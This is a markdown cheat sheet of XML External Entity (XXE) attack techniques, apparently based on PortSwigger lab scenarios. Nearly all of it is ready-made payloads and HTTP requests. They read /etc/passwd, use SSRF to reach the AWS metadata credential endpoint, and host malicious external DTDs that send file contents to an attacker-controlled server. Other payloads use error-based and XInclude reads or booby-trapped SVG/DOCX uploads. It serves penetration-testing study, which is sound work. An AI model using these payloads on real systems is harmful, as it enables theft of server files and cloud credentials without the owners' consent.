# XXE (XML External Entity)
## [REFERENCE](https://portswigger.net/web-security/xxe)

## What is XXE ??

   1) Web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 

   2) It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

## Root Cause of XXE ?? 

   1) Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. 

   2) XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.   
---

### ########### ATTACK SCENARIO_############   

### 1 - Exploiting XXE to retrieve files 

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server and display the results and errors and the request goes like this ...

	   POST /product/stock HTTP/2
	   Host: subdomain.target.com
	   Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   Content-Length: 107
	   ...
	   ...
	   Connection: close
       ..
	   <?xml version="1.0" encoding="UTF-8"?>
	   <stockCheck>
	    <productId>2</productId>
		<storeId>1</storeId>
	   </stockCheck>

2) Here the application fetches the stock of the product by parsing XML input. (1-productId, 2-storeId)
3) So we can add our payload : `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
4) and by calling the `%xxe` entity , we get the content of `/etc/passwd` in the response, 
	So the payload looks like this...

	   <?xml version="1.0" encoding="UTF-8"?>
	   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	    <stockCheck>
	    	<productId>2&xxe;</productId>
	    	<storeId>1</storeId>
	    </stockCheck>
---
### 2 - Exploiting XXE to perform SSRF attacks

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server and display the result the and request goes like this ...


	   POST /product/stock HTTP/2
	   Host: subdomain.target.com
	   Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   Content-Length: 107
	   ...
	   ...
	   Connection: close
       ..
	   <?xml version="1.0" encoding="UTF-8"?>
	   <stockCheck>
	      <productId>2</productId>
		  <storeId>1</storeId>
	   </stockCheck>

2) Now as same as the above case(where we extract the file content) , we can perform SSRF(server side request forgery) attack.
3) To perform SSRF , we add the `localhost` or applications `internal host` in the place of `file://` in the payload
4) Now the whole payload look like this...

       <?xml version="1.0" encoding="UTF-8"?>
	   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
	   <stockCheck>
	      <productId>2&xxe;</productId>
	      <storeId>1</storeId>
	    </stockCheck>
    
 5) In the above case we perform SSRF to extract AWS creds , we can also perform on applications internal services.
 ---
### ##BLIND XXE 

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server but does not display the result.


	   POST /product/stock HTTP/2
		Host: subdomain.target.com
		Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
		Content-Length: 107
		...
		...
		Connection: close
       ..
	   <?xml version="1.0" encoding="UTF-8"?>
	   <stockCheck>
	     <productId>2</productId>
		 <storeId>1</storeId>
       </stockCheck>

2) Now as same as the above case(where we perform SSRF) , if in case SSRF won't work, we can test for blind XXE.
3) To perform Blind XXE , we add the our server addrs or burp collaborator cli. in the ENTITY.
4) Now the whole payload look like this...

	    <?xml version="1.0" encoding="UTF-8"?>
	    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "burp_collaborator_client.net"> ]>
	    	<stockCheck>
	    		<productId>2&xxe;</productId>
	    		<storeId>1</storeId>
	    	</stockCheck>
    
5) If we get DNS and HTTP interaction, Blind XXE confirmed..!!
---
### 3 - Blind XXE via XML parameter entities

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server but does not display the result.


	   POST /product/stock HTTP/2
	   Host: subdomain.target.com
	   Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   Content-Length: 107
		...
		...
	   Connection: close
       ...
	   <?xml version="1.0" encoding="UTF-8"?>
	   <stockCheck>
	      <productId>2</productId>
		  <storeId>1</storeId>
	   </stockCheck>

2) Now as same as the above case(where we perform Blind XXE) , if in case it won't work we can test for bypass.
3) To perform Blind XXE via xml parameter, we do the same process as above but this time we call our entity in the ENTITY itself.
4) So the whole payload look like this...

       <?xml version="1.0" encoding="UTF-8"?>
	   <!DOCTYPE foo [<!ENTITY % prakhar SYSTEM "https://burp_collaborator_client"> %prakhar;] >
	   <stockCheck>
	      <productId>2</productId>
	      <storeId>1</storeId>
	   </stockCheck>
    
5) If we get DNS and HTTP interaction, Blind XXE confirmed..!!
---
### 4 - Blind XXE to exfiltrate data by external malicious DTD

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server and the request goes like this ...

	   POST /product/stock HTTP/2
	   Host: subdomain.target.com
	   Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   Content-Length: 107
	   ...
	   ...
	   Connection: close
       ..
	   <?xml version="1.0" encoding="UTF-8"?>
	   <stockCheck>
		    <productId>2</productId>
			<storeId>1</storeId>
	   </stockCheck>

2) Now this case is pretty different. In this case we put a malicious DTD(Document Type Definition) in our(attacker) own server and then we extract the content by the manipulating server with the interaction of our malicious DTD, malicious DTD look like this..

       <!ENTITY % file SYSTEM "file:///etc/passwd">
       <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://burp_collaborator_client.net/?x=%file;'>">
	   %eval;
	   %exfil;

3) So, the request we send through application by adding our payload look like this.

	       POST /product/stock HTTP/2
			Host: subdomain.target.com
			Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
			Content-Length: 107
			...
			...
			Connection: close
			   ...
		    <?xml version="1.0" encoding="UTF-8"?>
		    <!DOCTYPE foo[<!ENTITY % prakhar SYSTEM "https://attacker_server.com/malicious.DTD"> %prakhar;]>
		      <stockCheck>
		      	<productId>2</productId>
			    <storeId>1</storeId>
			  </stockCheck>

 4) In the above case the attack scenario will .. 
   		
   	   - 1 - When we send the request with `%prakhar` entity, application go for `http://attacker_server.com/malicious.DTD`
   		
   		- 2 - Then the application run the attacker's `malicious.DTD` file in which 
   		      
   		 - 3  - The application first evaluate the `%eval` ENTITY, in which `%exfil` ENTITY is also mentioned i..e  
   		      
   		        `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://burp_collaborator_client.net/?x=%file;'>">`

          - 4 - Then the application calls `%exfil` ENTITY [ &#x25; --> % ] through which application send DNS lookup to 
                `burp_collaborator_client.net` and..

           - 5 - Then it evaluate `%file` ENTITY and exfiltrate the content of the `file://` we mentioned from the application server.

           - 6 - Then Application send a HTTP request with `x` parameter with the content of the `file://`.

5) - At last, the attacker get the the content of the `%file` in the attacker controlled `burp_collaborator_client.`

6) The attacker server with `malicious.DTD` file look like this at `[http://attacker_server.com/malicious.DTD]`

		<!ENTITY % file SYSTEM "file:///etc/passwd">
		<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://burp_collaborator_client.net/?x=%file;'>">
		%eval;
		%exfil;

7) By this technique, we get DNS and HTTP interaction with file content.
---
### 5 - Exploiting Blind XXE to retrieve data
1) Consider we're testing an E-commerce application in which application fetches stock of the product from server and the request goes like this ...

	       POST /product/stock HTTP/2
			Host: subdomain.target.com
			Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
			Content-Length: 107
			...
			...
			Connection: close
          ..
		    <?xml version="1.0" encoding="UTF-8"?>
		      <stockCheck>
		      	<productId>2</productId>
			    <storeId>1</storeId>
			  </stockCheck>

2) In this case we put a malicious DTD(Document Type Definition) in our(attacker) own server and then we extract the content by the manipulating server with the interaction of our malicious DTD, malicious DTD look like this..

		<!ENTITY % file SYSTEM "file:///etc/passwd">
		<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///unknown_file/%file;'>">
		%eval;
		%exfil;

3) So, the request we send through application by adding our payload look like this.

	           POST /product/stock HTTP/2
	   		Host: subdomain.target.com
	   		Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   		Content-Length: 107
	   		...
	   		...
	   		Connection: close
	   		 ..  
	   	    <?xml version="1.0" encoding="UTF-8"?>
	   	    <!DOCTYPE foo[<!ENTITY % prakhar SYSTEM "https://attacker_server.com/malicious.DTD"> %prakhar;]>
	   	      <stockCheck>
	   	      	<productId>2</productId>
	   		    <storeId>1</storeId>
	   		  </stockCheck>

4) In the above case the attack scenario will .. 
   		
   	- 1 - When we send the request with `%prakhar` ENTITY, application go for `http://attacker_server.com/malicious.DTD`
   		
   	- 2 - Then the application run the attacker's `malicious.DTD` file in which 
   		      
   		 - The application first evaluate the `%eval` ENTITY, in which `%exfil` ENTITY is also mentioned i..e  
   		      
   		        `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///unknown_file/%file;'>">`

          - Then the application calls `%exfil` ENTITY [ &#x25; --> % ] through which application check for
                `file://unknown_file` into it's own server.

           - Then it evaluate `%file` ENTITY and exfiltrate the content of the `file:///etc/passwd` from it's own server.

           - Then the Application send a HTTP response with the error of `unknown_file` and the content of the 
                `file://etc/passwd`.

     - 3 - At last, the attacker will get the the content of the `%file` i..e (/etc/passwd) in the response

5) The attacker server with `malicious.DTD` file look like this at `[http://attacker_server.com/malicious.DTD]`

		<!ENTITY % file SYSTEM "file:///etc/passwd">
		<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///unknown_file/%file;'>">
		%eval;
		%exfil;

6) we get error of `unknown_file` or content of `/etc/passwd`. 
---
### 6 - Exploiting XInclude to retrieve files

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server and the request goes like this ...

	       POST /product/stock HTTP/2
			Host: subdomain.target.com
			Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
			Content-Length: 107
			...
			...
			Connection: close
           ...
           productId=1&storeId=2

2) Now in this case we cannot carry out a classic XXE attack or define a DTD, coz Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. 
An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

3) However, we might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. we can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where we only control a single item of data that is placed into a server-side XML document.  

4) So, we can simple check by putting out `XInclude` payload in one of the POST body parameter.

       `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
   
5) So the final request look like..

   	   POST /product/stock HTTP/2
	   Host: subdomain.target.com
	   Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   Content-Length: 107
	   ...
	   ...
	   Connection: close
	   ...  
	   productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=2`
---
### 7 - Exploiting XXE via image file upload 

1) Consider we're testing an blog/social media web application in which application has a feature of uploading avatars/images or Documents.

2) We can make malicious XML-based formats such as `DOCX`(office_document_formats) and `SVG` (Image_format) to test for XXE.

       <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
       <svg width="128px" height="128px"    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
  
3) Save the above payload as `xxe.svg` and `xxe.docx` , and upload to reach hidden attack surface for XXE.
---
### 8 - Exploiting XXE to retrieve data by repurposing a local DTD

1) Consider we're testing an E-commerce application in which application fetches stock of the product from server and the request goes like this ...

	   POST /product/stock HTTP/2
	   Host: subdomain.target.com
	   Cookie: session=ULqvEo6l9eIJ36rlH4NmVQivmqegNurA
	   Content-Length: 107
	   ...
	   ...
	   Connection: close
       ...
	   <?xml version="1.0" encoding="UTF-8"?>
	   <stockCheck>
		   <productId>2</productId>
		   <storeId>1</storeId>
	   </stockCheck>

 2) We add the below payload in our POST request body

       <!DOCTYPE foo [
		<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
		<!ENTITY % ISOamso '
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		&#x25;eval;
		&#x25;error;
		'>
		%local_dtd;]>		  

---
---
